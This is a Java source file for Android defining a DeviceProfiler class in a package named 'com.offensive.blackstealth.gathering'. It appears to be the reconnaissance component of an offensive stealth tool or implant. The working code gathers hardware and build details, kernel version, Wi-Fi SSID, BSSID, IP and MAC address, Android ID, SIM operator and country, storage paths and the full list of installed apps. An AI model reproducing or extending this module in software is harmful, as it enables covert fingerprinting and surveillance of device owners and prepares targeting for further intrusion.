package com.offensive.blackstealth.gathering;

import android.content.Context;
import android.os.Build;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.net.wifi.WifiManager;
import android.net.wifi.WifiInfo;
import java.io.*;
import java.net.NetworkInterface;
import java.util.*;

/**
 * DeviceProfiler - Collects comprehensive device information
 */
public class DeviceProfiler {
    private Context context;
    
    public DeviceProfiler(Context context) {
        this.context = context;
    }
    
    /**
     * Get complete device profile
     */
    public Map<String, Object> getFullProfile() {
        Map<String, Object> profile = new HashMap<>();
        
        profile.put("hardware", getHardwareInfo());
        profile.put("software", getSoftwareInfo());
        profile.put("network", getNetworkInfo());
        profile.put("identifiers", getDeviceIdentifiers());
        profile.put("storage", getStorageInfo());
        profile.put("installed_apps", getInstalledApps());
        
        return profile;
    }
    
    public Map<String, String> getHardwareInfo() {
        Map<String, String> info = new HashMap<>();
        info.put("manufacturer", Build.MANUFACTURER);
        info.put("model", Build.MODEL);
        info.put("device", Build.DEVICE);
        info.put("board", Build.BOARD);
        info.put("hardware", Build.HARDWARE);
        info.put("product", Build.PRODUCT);
        info.put("cpuAbi", Build.SUPPORTED_ABIS[0]);
        info.put("cores", String.valueOf(Runtime.getRuntime().availableProcessors()));
        info.put("totalMemory", getTotalMemory());
        return info;
    }
    
    public Map<String, String> getSoftwareInfo() {
        Map<String, String> info = new HashMap<>();
        info.put("sdkVersion", String.valueOf(Build.VERSION.SDK_INT));
        info.put("release", Build.VERSION.RELEASE);
        info.put("securityPatch", Build.VERSION.SECURITY_PATCH);
        info.put("buildId", Build.DISPLAY);
        info.put("fingerprint", Build.FINGERPRINT);
        info.put("bootloader", Build.BOOTLOADER);
        info.put("kernel", getKernelVersion());
        return info;
    }
    
    public Map<String, String> getNetworkInfo() {
        Map<String, String> info = new HashMap<>();
        try {
            WifiManager wm = (WifiManager) context.getApplicationContext()
                .getSystemService(Context.WIFI_SERVICE);
            WifiInfo wifiInfo = wm.getConnectionInfo();
            info.put("ssid", wifiInfo.getSSID());
            info.put("bssid", wifiInfo.getBSSID());
            info.put("ipAddress", intToIp(wifiInfo.getIpAddress()));
            info.put("macAddress", getMacAddress());
        } catch (Exception e) {
            info.put("error", e.getMessage());
        }
        return info;
    }
    
    public Map<String, String> getDeviceIdentifiers() {
        Map<String, String> info = new HashMap<>();
        info.put("androidId", Settings.Secure.getString(
            context.getContentResolver(), Settings.Secure.ANDROID_ID));
        
        try {
            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            info.put("phoneType", String.valueOf(tm.getPhoneType()));
            info.put("networkOperator", tm.getNetworkOperatorName());
            info.put("simOperator", tm.getSimOperatorName());
            info.put("simCountry", tm.getSimCountryIso());
        } catch (Exception e) {}
        
        return info;
    }
    
    public Map<String, String> getStorageInfo() {
        Map<String, String> info = new HashMap<>();
        File internal = context.getFilesDir();
        info.put("internalPath", internal.getAbsolutePath());
        info.put("internalFree", String.valueOf(internal.getFreeSpace() / 1024 / 1024) + " MB");
        info.put("internalTotal", String.valueOf(internal.getTotalSpace() / 1024 / 1024) + " MB");
        
        File external = context.getExternalFilesDir(null);
        if (external != null) {
            info.put("externalPath", external.getAbsolutePath());
            info.put("externalFree", String.valueOf(external.getFreeSpace() / 1024 / 1024) + " MB");
        }
        return info;
    }
    
    public List<String> getInstalledApps() {
        List<String> apps = new ArrayList<>();
        try {
            List<android.content.pm.ApplicationInfo> packages = context.getPackageManager()
                .getInstalledApplications(0);
            for (android.content.pm.ApplicationInfo app : packages) {
                apps.add(app.packageName);
            }
        } catch (Exception e) {}
        return apps;
    }
    
    private String getTotalMemory() {
        try {
            BufferedReader reader = new BufferedReader(new FileReader("/proc/meminfo"));
            String line = reader.readLine();
            reader.close();
            if (line != null) {
                String[] parts = line.split("\\s+");
                if (parts.length >= 2) {
                    return parts[1] + " kB";
                }
            }
        } catch (Exception e) {}
        return "unknown";
    }
    
    private String getKernelVersion() {
        try {
            BufferedReader reader = new BufferedReader(new FileReader("/proc/version"));
            String line = reader.readLine();
            reader.close();
            return line != null ? line.split(" ")[2] : "unknown";
        } catch (Exception e) {
            return "unknown";
        }
    }
    
    private String getMacAddress() {
        try {
            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
            while (interfaces.hasMoreElements()) {
                NetworkInterface ni = interfaces.nextElement();
                if (ni.getName().equalsIgnoreCase("wlan0")) {
                    byte[] mac = ni.getHardwareAddress();
                    if (mac != null) {
                        StringBuilder sb = new StringBuilder();
                        for (int i = 0; i < mac.length; i++) {
                            sb.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? ":" : ""));
                        }
                        return sb.toString();
                    }
                }
            }
        } catch (Exception e) {}
        return "unknown";
    }
    
    private String intToIp(int ip) {
        return (ip & 0xFF) + "." + ((ip >> 8) & 0xFF) + "." + 
               ((ip >> 16) & 0xFF) + "." + ((ip >> 24) & 0xFF);
    }
}
